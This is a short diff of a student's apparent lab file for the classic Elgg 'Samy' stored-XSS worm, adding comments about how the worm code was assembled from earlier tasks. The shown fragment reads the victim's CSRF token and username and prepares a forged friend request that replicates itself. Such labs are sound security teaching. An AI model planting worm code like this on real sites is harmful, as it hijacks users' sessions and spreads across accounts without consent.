@@ -1,5 +1,6 @@
 <script type="text/javascript" id="worm">
 
+
     window.onload = function () 
     {
         var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
@@ -12,6 +13,14 @@
         var token="&__elgg_token="+elgg.security.token.__elgg_token;
         var thisprofilename=elgg.session.user.username;
         //Construct the HTTP request to add Samy as a friend.
+
+
+//         At first wormcode was constructed using the code given in the cheetsheet.
+// I just needed to pipeline task 1,2 and 3 .With a little change in the task 2 code part,
+
+// In that part , I changed the content to contain wormcode.
+
+// The rest was as same as previous ones.
     
         if(thisprofilename!="samy")
         {
